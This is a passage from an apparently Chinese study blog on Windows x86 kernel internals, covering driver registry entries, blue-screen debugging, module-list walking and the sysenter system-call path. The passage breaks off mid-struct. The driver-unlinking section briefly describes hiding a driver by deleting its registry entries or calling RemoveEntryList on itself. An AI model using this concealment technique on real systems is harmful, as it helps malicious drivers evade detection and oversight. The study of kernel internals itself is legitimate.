class=\"meta\">#<span class=\"keyword\">endif</span> <span class=\"comment\">// MIDL_PASS</span></span></span><br><span class=\"line\">&#125; UNICODE_STRING;</span><br></pre></td></tr></table></figure>\n\n<p>加载驱动,使用DbgView捕获输出<code>Capture-&gt;Cpature Kernel</code>,<code>Capture-&gt;Enable Verbose Kernel Output</code></p>\n<p><img src=\"/../images/Window-Kernel/x86%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91/image-20230524172139616.png\" alt=\"image-20230524172139616\"></p>\n<p>然后打开到对应的注册表查看。</p>\n<p><img src=\"/../images/Window-Kernel/x86%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91/image-20230524172346766.png\" alt=\"image-20230524172346766\"></p>\n<ul>\n<li>DisplayName：驱动对外显示的名字,比如PCHunter枚举驱动模块时显示的名字</li>\n<li>ErrorControl：母鸡</li>\n<li>ImagePath：驱动模块的路径，<code>\\??\\</code>为全路径磁盘就是挂载这个上面</li>\n<li>Start：驱动加载的类型,&lt;&#x3D;2为开启自启，数字越低自启动时机与早。</li>\n<li>Type：类型，1为驱动模块,0好像是服务。</li>\n</ul>\n<p>驱动加载时，系统会将这些信息写入注册表，然后在拉起驱动模块。</p>\n<p>驱动卸载时，系统首先会调用驱动的卸载函数(如果不设置则无法卸载)，然后删除注册表。</p>\n<p>当一个正常的内核模块加载完成时，注册表就保存着他的信息，通过枚举注册表即可获取系统加载的驱动模块，因此绕过这中枚举方法就是隐藏自己的注册表，例如驱动加载完毕后删除注册表。</p>\n<h1 id=\"二、蓝屏调试\"><a href=\"#二、蓝屏调试\" class=\"headerlink\" title=\"二、蓝屏调试\"></a>二、蓝屏调试</h1><p>当产生蓝屏时可以通过执行<code>!analyze -v</code>来获取详细信息。大概流程为：</p>\n<h2 id=\"1、执行-analyze-v获取详细信息。\"><a href=\"#1、执行-analyze-v获取详细信息。\" class=\"headerlink\" title=\"1、执行!analyze -v获取详细信息。\"></a>1、执行<code>!analyze -v</code>获取详细信息。</h2><p><img src=\"/../images/Window-Kernel/x86%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91/image-20230524173256871.png\" alt=\"image-20230524173256871\"></p>\n<h2 id=\"2、根据信息给出的蓝屏原因进行搜索。\"><a href=\"#2、根据信息给出的蓝屏原因进行搜索。\" class=\"headerlink\" title=\"2、根据信息给出的蓝屏原因进行搜索。\"></a>2、根据信息给出的蓝屏原因进行搜索。</h2><p><img src=\"/../images/Window-Kernel/x86%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91/image-20230524173602468.png\" alt=\"image-20230524173602468\"></p>\n<p>根据给出的原因到<code>https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/</code>搜索</p>\n<p><img src=\"/../images/Window-Kernel/x86%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91/image-20230524173355010.png\" alt=\"image-20230524173355010\"></p>\n<p>然后根据windbg给出的参数进行大致排查原因。</p>\n<h2 id=\"3、根据栈回溯查找原因\"><a href=\"#3、根据栈回溯查找原因\" class=\"headerlink\" title=\"3、根据栈回溯查找原因\"></a>3、根据栈回溯查找原因</h2><p><img src=\"/../images/Window-Kernel/x86%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91/image-20230524173756293.png\" alt=\"image-20230524173756293\"></p>\n<p>可以大致看到最后一次自己模块的调用位置。还有异常所处的模块是什么。</p>\n<ul>\n<li>k、kv:查看堆栈</li>\n</ul>\n<h1 id=\"三、驱动断链\"><a href=\"#三、驱动断链\" class=\"headerlink\" title=\"三、驱动断链\"></a>三、驱动断链</h1><p>PDRIVER_OBJECT中的DriverSection实际上是一个链表，结构为：<code>KLDR_DATA_TABLE_ENTRY</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">NON_PAGED_DEBUG_INFO</span> &#123;</span></span><br><span class=\"line\">\tUSHORT      Signature;</span><br><span class=\"line\">\tUSHORT      Flags;</span><br><span class=\"line\">\tULONG       Size;</span><br><span class=\"line\">\tUSHORT      Machine;</span><br><span class=\"line\">\tUSHORT      Characteristics;</span><br><span class=\"line\">\tULONG       TimeDateStamp;</span><br><span class=\"line\">\tULONG       CheckSum;</span><br><span class=\"line\">\tULONG       SizeOfImage;</span><br><span class=\"line\">\tULONGLONG   ImageBase;</span><br><span class=\"line\">&#125; NON_PAGED_DEBUG_INFO, *PNON_PAGED_DEBUG_INFO;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">KLDR_DATA_TABLE_ENTRY</span> &#123;</span></span><br><span class=\"line\">\tLIST_ENTRY InLoadOrderLinks;</span><br><span class=\"line\">\tPVOID ExceptionTable;</span><br><span class=\"line\">\tULONG ExceptionTableSize;</span><br><span class=\"line\">\t<span class=\"comment\">// ULONG padding on IA64</span></span><br><span class=\"line\">\tPVOID GpValue;</span><br><span class=\"line\">\tPNON_PAGED_DEBUG_INFO NonPagedDebugInfo;</span><br><span class=\"line\">\tPVOID DllBase;</span><br><span class=\"line\">\tPVOID EntryPoint;</span><br><span class=\"line\">\tULONG SizeOfImage;</span><br><span class=\"line\">\tUNICODE_STRING FullDllName;</span><br><span class=\"line\">\tUNICODE_STRING BaseDllName;</span><br><span class=\"line\">\tULONG Flags;</span><br><span class=\"line\">\tUSHORT LoadCount;</span><br><span class=\"line\">\tUSHORT __Unused5;</span><br><span class=\"line\">\tPVOID SectionPointer;</span><br><span class=\"line\">\tULONG CheckSum;</span><br><span class=\"line\">\t<span class=\"comment\">// ULONG padding on IA64</span></span><br><span class=\"line\">\tPVOID LoadedImports;</span><br><span class=\"line\">\tPVOID PatchInformation;</span><br><span class=\"line\">&#125; KLDR_DATA_TABLE_ENTRY, *PKLDR_DATA_TABLE_ENTRY;</span><br></pre></td></tr></table></figure>\n\n<p>如果遍历可以得到非处理的驱动模块(隐藏的不行)。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">NTSTATUS <span class=\"title function_\">DriverEntry</span><span class=\"params\">(PDRIVER_OBJECT pDrv, PUNICODE_STRING pReg)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tNTSTATUS status = STATUS_SUCCESS;</span><br><span class=\"line\">\t<span class=\"keyword\">do</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tpDrv-&gt;DriverUnload = DrvUnload;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tPKLDR_DATA_TABLE_ENTRY header = pDrv-&gt;DriverSection;</span><br><span class=\"line\">\t\tPKLDR_DATA_TABLE_ENTRY curt = header;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">do</span></span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\tKdPrint((<span class=\"string\">&quot;DllBase:%p\\n&quot;</span>,curt-&gt;DllBase));</span><br><span class=\"line\">\t\tKdPrint((<span class=\"string\">&quot;EntryPoint:%p\\n&quot;</span>, curt-&gt;EntryPoint));</span><br><span class=\"line\">\t\tKdPrint((<span class=\"string\">&quot;SizeOfImage:%p\\n&quot;</span>, curt-&gt;SizeOfImage));</span><br><span class=\"line\">\t\tKdPrint((<span class=\"string\">&quot;FullDllName:%wZ\\n&quot;</span>, &amp;curt-&gt;FullDllName));</span><br><span class=\"line\">\t\tKdPrint((<span class=\"string\">&quot;BaseDllName:%wZ\\n&quot;</span>, &amp;curt-&gt;BaseDllName));</span><br><span class=\"line\">\t\tcurt = curt-&gt;InLoadOrderLinks.Flink;</span><br><span class=\"line\">\t\t&#125;<span class=\"keyword\">while</span> (header != curt);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t&#125; <span class=\"keyword\">while</span> (FALSE);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> status;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/../images/Window-Kernel/x86%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91/image-20230524174607757.png\" alt=\"image-20230524174607757\"></p>\n<p>其中可以看到第一个是自身，调用<code>RemoveEntryList</code>断链自身即可隐藏，但比较弱。</p>\n","categories":["Windows-Kernel"]},{"title":"x86系统调用","url":"/2023/06/06/x86%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/","content":"<h1 id=\"1、R3进入R0\"><a href=\"#1、R3进入R0\" class=\"headerlink\" title=\"1、R3进入R0\"></a>1、R3进入R0</h1><p><code>WindowsXp</code>前R3进入R0都是依靠中断门<code>(0x2E)</code>进行提权，这种提权方式较为复杂，需要压入SS、CS、EIP、ESP等等一系列复杂操作。因此Xp后引入快速调用<code>(FastCall)</code>。</p>\n<p><img src=\"/../images/Window-Kernel/x86%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/image-20230606174405820.png\" alt=\"image-20230606174405820\"></p>\n<p><img src=\"/../images/Window-Kernel/x86%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/image-20230606174544302.png\" alt=\"image-20230606174544302\"></p>\n<p>x86使用的是sysenter&#x2F;sysreturn,x64是syscall&#x2F;sysexit。</p>\n<p>以API<code>ReadProcessMemory</code>为例，使用CE跳转到该函数，然后手动跟踪。</p>\n<p><img src=\"/../images/Window-Kernel/x86%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/image-20230606174830637.png\" alt=\"image-20230606174830637\"></p>\n<p><img src=\"/../images/Window-Kernel/x86%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/image-20230606174744294.png\" alt=\"image-20230606174744294\"></p>\n<p>可以看到调用过程如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">kernel32.ReadProcessMemory-&gt;kernelbase.ReadProcessMemory-&gt;ntdll.ZwReadVirtualMemory</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>“Window7有一项变化，即对Kernel32.dll做了重构，引入KernelBase.dll，把原本实现在Kernel32.dll中的逻辑移到Kernelbase.dll中，Kernel32只保留了接口，这样修改后，负责用户空间开发的团队只需要使用稳定版本的Kernel32.dll，不需要频繁更新，负责内核空间的团队如果对底层做修改，一般只需要修改Kernelbase.dll，不需要更新Kernel32.dll，两个团队之间的相互牵制大大减少。”   –《软件调试-卷二：Windows平台调试(上)》</p>\n</blockquote>\n<p>其中ZwReadVirtualMemory中只通过一条<code>call [edx]</code>即可完成函数调用，实际上edx指向的地址为<code>_KUSER_SHARED_DATA</code>中的成员<code>SystemCall</code>，该成员保存着快速调用函数的入口。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//0x5f0 bytes (sizeof)</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">KUSER_SHARED_DATA</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    ULONG TickCountLowDeprecated;                                           <span class=\"comment\">//0x0</span></span><br><span class=\"line\">    ULONG TickCountMultiplier;                                              <span class=\"comment\">//0x4</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">KSYSTEM_TIME</span> <span class=\"title\">InterruptTime</span>;</span>                            <span class=\"comment\">//0x8</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">KSYSTEM_TIME</span> <span class=\"title\">SystemTime</span>;</span>                               <span class=\"comment\">//0x14</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">KSYSTEM_TIME</span> <span class=\"title\">TimeZoneBias</span>;</span>                             <span class=\"comment\">//0x20</span></span><br><span class=\"line\">    USHORT ImageNumberLow;                                                  <span class=\"comment\">//0x2c</span></span><br><span class=\"line\">    USHORT ImageNumberHigh;                                                 <span class=\"comment\">//0x2e</span></span><br><span class=\"line\">    WCHAR NtSystemRoot[<span class=\"number\">260</span>];                                                <span class=\"comment\">//0x30</span></span><br><span class=\"line\">    ULONG MaxStackTraceDepth;                                               <span class=\"comment\">//0x238</span></span><br><span class=\"line\">    ULONG CryptoExponent;                                                   <span class=\"comment\">//0x23c</span></span><br><span class=\"line\">    ULONG TimeZoneId;                                                       <span class=\"comment\">//0x240</span></span><br><span class=\"line\">    ULONG LargePageMinimum;                                                 <span class=\"comment\">//0x244</span></span><br><span class=\"line\">    ULONG Reserved2[<span class=\"number\">7</span>];                                                     <span class=\"comment\">//0x248</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">enum</span> _<span class=\"title\">NT_PRODUCT_TYPE</span> <span class=\"title\">NtProductType</span>;</span>                                    <span class=\"comment\">//0x264</span></span><br><span class=\"line\">    UCHAR ProductTypeIsValid;                                               <span class=\"comment\">//0x268</span></span><br><span class=\"line\">    ULONG NtMajorVersion;                                                   <span class=\"comment\">//0x26c</span></span><br><span class=\"line\">    ULONG NtMinorVersion;                                                   <span class=\"comment\">//0x270</span></span><br><span class=\"line\">    UCHAR ProcessorFeatures[<span class=\"number\">64</span>];                                            <span class=\"comment\">//0x274</span></span><br><span class=\"line\">    ULONG Reserved1;                                                        <span class=\"comment\">//0x2b4</span></span><br><span class=\"line\">    ULONG Reserved3;                                                        <span class=\"comment\">//0x2b8</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> ULONG TimeSlip;                                                <span class=\"comment\">//0x2bc</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">enum</span> _<span class=\"title\">ALTERNATIVE_ARCHITECTURE_TYPE</span> <span class=\"title\">AlternativeArchitecture</span>;</span>            <span class=\"comment\">//0x2c0</span></span><br><span class=\"line\">    ULONG AltArchitecturePad[<span class=\"number\">1</span>];                                            <span class=\"comment\">//0x2c4</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">union</span> _<span class=\"title\">LARGE_INTEGER</span> <span class=\"title\">SystemExpirationDate</span>;</span>                              <span class=\"comment\">//0x2c8</span></span><br><span class=\"line\">    ULONG SuiteMask;                                                        <span class=\"comment\">//0x2d0</span></span><br><span class=\"line\">    UCHAR KdDebuggerEnabled;                                                <span class=\"comment\">//0x2d4</span></span><br><span class=\"line\">    UCHAR NXSupportPolicy;                                                  <span class=\"comment\">//0x2d5</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> ULONG ActiveConsoleId;                                         <span class=\"comment\">//0x2d8</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> ULONG DismountCount;                                           <span class=\"comment\">//0x2dc</span></span><br><span class=\"line\">    ULONG ComPlusPackage;                                                   <span class=\"comment\">//0x2e0</span></span><br><span class=\"line\">    ULONG LastSystemRITEventTickCount;                                      <span class=\"comment\">//0x2e4</span></span><br><span class=\"line\">    ULONG NumberOfPhysicalPages;                                            <span class=\"comment\">//0x2e8</span></span><br><span class=\"line\">    UCHAR SafeBootMode;                                                     <span class=\"comment\">//0x2ec</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">union</span></span></span><br><span class=\"line\"><span class=\"class\">    &#123;</span></span><br><span class=\"line\">        UCHAR TscQpcData;                                                   <span class=\"comment\">//0x2ed</span></span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span></span></span><br><span class=\"line\"><span class=\"class\">        &#123;</span></span><br><span class=\"line\">            UCHAR TscQpcEnabled:<span class=\"number\">1</span>;                                          <span class=\"comment\">//0x2ed</span></span><br><span class=\"line\">            UCHAR TscQpcSpareFlag:<span class=\"number\">1</span>;                                        <span class=\"comment\">//0x2ed</span></span><br><span class=\"line\">            UCHAR TscQpcShift:<span class=\"number\">6</span>;                                            <span class=\"comment\">//0x2ed</span></span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    UCHAR TscQpcPad[<span class=\"number\">2</span>];                                                     <span class=\"comment\">//0x2ee</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">union</span></span></span><br><span class=\"line\"><span class=\"class\">    &#123;</span></span><br><span class=\"line\">        ULONG SharedDataFlags;                                              <span class=\"comment\">//0x2f0</span></span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span></span></span><br><span class=\"line\"><span class=\"class\">        &#123;</span></span><br><span class=\"line\">            ULONG DbgErrorPortPresent:<span class=\"number\">1</span>;                                    <span class=\"comment\">//0x2f0</span></span><br><span class=\"line\">            ULONG DbgElevationEnabled:<span class=\"number\">1</span>;                                    <span class=\"comment\">//0x2f0</span></span><br><span class=\"line\">            ULONG DbgVirtEnabled:<span class=\"number\">1</span>;                                         <span class=\"comment\">//0x2f0</span></span><br><span class=\"line\">            ULONG DbgInstallerDetectEnabled:<span class=\"number\">1</span>;                              <span class=\"comment\">//0x2f0</span></span><br><span class=\"line\">            ULONG DbgSystemDllRelocated:<span class=\"number\">1</span>;                                  <span class=\"comment\">//0x2f0</span></span><br><span class=\"line\">            ULONG DbgDynProcessorEnabled:<span class=\"number\">1</span>;                                 <span class=\"comment\">//0x2f0</span></span><br><span class=\"line\">            ULONG DbgSEHValidationEnabled:<span class=\"number\">1</span>;                                <span class=\"comment\">//0x2f0</span></span><br><span class=\"line\">            ULONG SpareBits:<span class=\"number\">25</span>;                                             <span class=\"comment\">//0x2f0</span></span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    ULONG DataFlagsPad[<span class=\"number\">1</span>];                                                  <span class=\"comment\">//0x2f4</span></span><br><span class=\"line\">    ULONGLONG TestRetInstruction;                                           <span class=\"comment\">//0x2f8</span></span><br><span class=\"line\">    ULONG SystemCall;                                                       <span class=\"comment\">//0x300</span></span><br><span class=\"line\">    ULONG SystemCallReturn;                                                 <span class=\"comment\">//0x304</span></span><br><span class=\"line\">    ULONGLONG SystemCallPad[<span class=\"number\">3</span>];                                             <span class=\"comment\">//0x308</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">union</span></span></span><br><span class=\"line\"><span class=\"class\">    &#123;</span></span><br><span class=\"line\">        <span class=\"keyword\">volatile</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">KSYSTEM_TIME</span> <span class=\"title\">TickCount</span>;</span>                            <span class=\"comment\">//0x320</span></span><br><span class=\"line\">        <span class=\"keyword\">volatile</span> ULONGLONG TickCountQuad;                                   <span class=\"comment\">//0x320</span></span><br><span class=\"line\">        ULONG ReservedTickCountOverlay[<span class=\"number\">3</span>];                                  <span class=\"comment\">//0x320</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    ULONG TickCountPad[<span class=\"number\">1</span>];                                                  <span class=\"comment\">//0x32c</span></span><br><span class=\"line\">    ULONG Cookie;                                                           <span class=\"comment\">//0x330</span></span><br><span class=\"line\">    ULONG CookiePad[<span class=\"number\">1</span>];                                                     <span class=\"comment\">//0x334</span></span><br><span class=\"line\">    LONGLONG ConsoleSessionForegroundProcessId;                             <span class=\"comment\">//0x338</span></span><br><span class=\"line\">    ULONG Wow64SharedInformation[<span class=\"number\">16</span>];                                       <span class=\"comment\">//0x340</span></span><br><span class=\"line\">    USHORT UserModeGlobalLogger[<span class=\"number\">16</span>];                                        <span class=\"comment\">//0x380</span></span><br><span class=\"line\">    ULONG ImageFileExecutionOptions;                                        <span class=\"comment\">//0x3a0</span></span><br><span class=\"line\">    ULONG LangGenerationCount;                                              <span class=\"comment\">//0x3a4</span></span><br><span class=\"line\">    ULONGLONG Reserved5;                                                    <span class=\"comment\">//0x3a8</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> ULONGLONG InterruptTimeBias;                                   <span class=\"comment\">//0x3b0</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> ULONGLONG TscQpcBias;                                          <span class=\"comment\">//0x3b8</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> ULONG ActiveProcessorCount;                                    <span class=\"comment\">//0x3c0</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> USHORT ActiveGroupCount;                                       <span class=\"comment\">//0x3c4</span></span><br><span class=\"line\">    USHORT Reserved4;                                                       <span class=\"comment\">//0x3c6</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> ULONG AitSamplingValue;                                        <span class=\"comment\">//0x3c8</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> ULONG AppCompatFlag;                                           <span class=\"comment\">//0x3cc</span></span><br><span class=\"line\">    ULONGLONG SystemDllNativeRelocation;                                    <span class=\"comment\">//0x3d0</span></span><br><span class=\"line\">    ULONG SystemDllWowRelocation;                                           <span class=\"comment\">//0x3d8</span></span><br><span class=\"line\">    ULONG XStatePad[<span class=\"number\">1</span>];                                                     <span class=\"comment\">//0x3dc</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">XSTATE_CONFIGURATION</span> <span class=\"title\">XState</span>;</span>                                    <span class=\"comment\">//0x3e0</span></span><br><span class=\"line\">&#125;; </span><br></pre></td></tr></table></figure>\n\n<p><code>_KUSER_SHARED_DATA</code>是R0和R3共享的一段内存，其中R3只有读权限，R0有读写权限。将edx的值减掉0x300可得到地址头。在R0下地址为fffe0000。随便附加一个R3进程，然后查看7ffe0000。</p>\n<p><img src=\"/../images/Window-Kernel/x86%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/image-20230606180430780.png\" alt=\"image-20230606180430780\"></p>\n<p>使用Windbg查看一下该处函数。</p>\n<p><img src=\"/../images/Window-Kernel/x86%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/image-20230606181016370.png\" alt=\"image-20230606181016370\"></p>\n<p>这里没有显示符号，到ce看一下。</p>\n<p><img src=\"/../images/Window-Kernel/x86%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/image-20230606181042043.png\" alt=\"image-20230606181042043\"></p>\n<p>实际上叫做KiFastSystemCall。其中sysenter指令执行时会跳转到MSR[176]指向的函数地址。快速调用之所以比中断门提权快是因为，快速调用进入内核的时，CS、SS、EIP、ESP均来自MSR寄存器，CPU直接读取后即可进入提权操作，并且快速调用中会自己保护上下文环境。中断门需要自己压参数，和保护上下文，性能上不如直接读取CPU寄存器快。</p>\n<table>\n<thead>\n<tr>\n<th>索引</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>174H</td>\n<td>CS</td>\n</tr>\n<tr>\n<td>175H</td>\n<td>ESP</td>\n</tr>\n<tr>\n<td>176H</td>\n<td>EIP</td>\n</tr>\n</tbody></table>\n<p>SS&#x3D;CS的值+8，因为SS的描述符是紧随着CS的描述符。</p>\n<p><img src=\"/../images/Window-Kernel/x86%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/image-20230606181545455.png\" alt=\"image-20230606181545455\"></p>\n<p><img src=\"/../images/Window-Kernel/x86%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/image-20230606185833671.png\" alt=\"image-20230606185833671\"></p>\n<p>使用windbg查看176位置的函数。</p>\n<p><img src=\"/../images/Window-Kernel/x86%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/image-20230606190001409.png\" alt=\"image-20230606190001409\"></p>\n<p>由于没有加载出符号，但实际上这个函数是<code>KiFastCallEntry</code></p>\n<p><img src=\"/../images/Window-Kernel/x86%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/image-20230606190256492.png\" alt=\"image-20230606190256492\"></p>\n<h2 id=\"1-2-分析KiFastCallEntry\"><a href=\"#1-2-分析KiFastCallEntry\" class=\"headerlink\" title=\"1.2 分析KiFastCallEntry\"></a>1.2 分析KiFastCallEntry</h2><p><img src=\"/../images/Window-Kernel/x86%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/image-20230606194041632.png\" alt=\"image-20230606194041632\"></p>\n<p>IDA中会看到还有一个KiFastCallEntry2，这是因为不是所有API都是过这个KiFastCallEntry，那个2是为了兼容其他框架。</p>\n<hr>\n<p>这里需要了解两个结构体，<code>KPCR</code>和<code>KTrap_Frame</code></p>\n<ul>\n<li>fs:[30]：在3环时，fs处指向的是PEB结构，0环下指向_KPCR结构。</li>\n</ul>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//0x3748 bytes (sizeof)</span></span><br><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">_KPCR</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">union</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">struct</span> <span class=\"title class_\">_NT_TIB</span> NtTib;                                               <span class=\"comment\">//0x0</span></span><br><span class=\"line\">        <span class=\"keyword\">struct</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">struct</span> <span class=\"title class_\">_EXCEPTION_REGISTRATION_RECORD</span>* Used_ExceptionList;      <span class=\"comment\">//0x0</span></span><br><span class=\"line\">            VOID* Used_StackBase;                                           <span class=\"comment\">//0x4</span></span><br><span class=\"line\">            VOID* Spare2;                                                   <span class=\"comment\">//0x8</span></span><br><span class=\"line\">            VOID* TssCopy;                                                  <span class=\"comment\">//0xc</span></span><br><span class=\"line\">            ULONG ContextSwitches;                                          <span class=\"comment\">//0x10</span></span><br><span class=\"line\">            ULONG SetMemberCopy;                                            <span class=\"comment\">//0x14</span></span><br><span class=\"line\">            VOID* Used_Self;                                                <span class=\"comment\">//0x18</span></span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_KPCR</span>* SelfPcr;                                                  <span class=\"comment\">//0x1c</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_KPRCB</span>* Prcb;                                                    <span class=\"comment\">//0x20</span></span><br><span class=\"line\">    UCHAR Irql;                                                             <span class=\"comment\">//0x24</span></span><br><span class=\"line\">    ULONG IRR;                                                              <span class=\"comment\">//0x28</span></span><br><span class=\"line\">    ULONG IrrActive;                                                        <span class=\"comment\">//0x2c</span></span><br><span class=\"line\">    ULONG IDR;                                                              <span class=\"comment\">//0x30</span></span><br><span class=\"line\">    VOID* KdVersionBlock;                                                   <span class=\"comment\">//0x34</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_KIDTENTRY</span>* IDT;                                                 <span class=\"comment\">//0x38</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_KGDTENTRY</span>* GDT;                                                 <span class=\"comment\">//0x3c</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_KTSS</span>* TSS;                                                      <span class=\"comment\">//0x40</span></span><br><span class=\"line\">    USHORT MajorVersion;                                                    <span class=\"comment\">//0x44</span></span><br><span class=\"line\">    USHORT MinorVersion;                                                    <span class=\"comment\">//0x46</span></span><br><span class=\"line\">    ULONG SetMember;                                                        <span class=\"comment\">//0x48</span></span><br><span class=\"line\">    ULONG StallScaleFactor;                                                 <span class=\"comment\">//0x4c</span></span><br><span class=\"line\">    UCHAR SpareUnused;                                                      <span class=\"comment\">//0x50</span></span><br><span class=\"line\">    UCHAR Number;                                                           <span class=\"comment\">//0x51</span></span><br><span class=\"line\">    UCHAR Spare0;                                                           <span class=\"comment\">//0x52</span></span><br><span class=\"line\">    UCHAR SecondLevelCacheAssociativity;                                    <span class=\"comment\">//0x53</span></span><br><span class=\"line\">    ULONG VdmAlert;                                                         <span class=\"comment\">//0x54</span></span><br><span class=\"line\">    ULONG KernelReserved[<span class=\"number\">14</span>];                                               <span class=\"comment\">//0x58</span></span><br><span class=\"line\">    ULONG SecondLevelCacheSize;                                             <span class=\"comment\">//0x90</span></span><br><span class=\"line\">    ULONG HalReserved[<span class=\"number\">16</span>];                                                  <span class=\"comment\">//0x94</span></span><br><span class=\"line\">    ULONG InterruptMode;                                                    <span class=\"comment\">//0xd4</span></span><br><span class=\"line\">    UCHAR Spare1;                                                           <span class=\"comment\">//0xd8</span></span><br><span class=\"line\">    ULONG KernelReserved2[<span class=\"number\">17</span>];                                              <span class=\"comment\">//0xdc</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_KPRCB</span> PrcbData;                                                 <span class=\"comment\">//0x120</span></span><br><span class=\"line\">&#125;; </span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>KTrap_Frame：栈帧，由于R3切换到R0，环境产生改变，因此需要保存。这个结构就是用来保存R3切换到R0的环境。</li>\n</ul>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//0x8c bytes (sizeof)</span></span><br><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">_KTRAP_FRAME</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    ULONG DbgEbp;                                                           <span class=\"comment\">//0x0</span></span><br><span class=\"line\">    ULONG DbgEip;                                                           <span class=\"comment\">//0x4</span></span><br><span class=\"line\">    ULONG DbgArgMark;                                                       <span class=\"comment\">//0x8</span></span><br><span class=\"line\">    ULONG DbgArgPointer;                                                    <span class=\"comment\">//0xc</span></span><br><span class=\"line\">    USHORT TempSegCs;                                                       <span class=\"comment\">//0x10</span></span><br><span class=\"line\">    UCHAR Logging;                                                          <span class=\"comment\">//0x12</span></span><br><span class=\"line\">    UCHAR Reserved;                          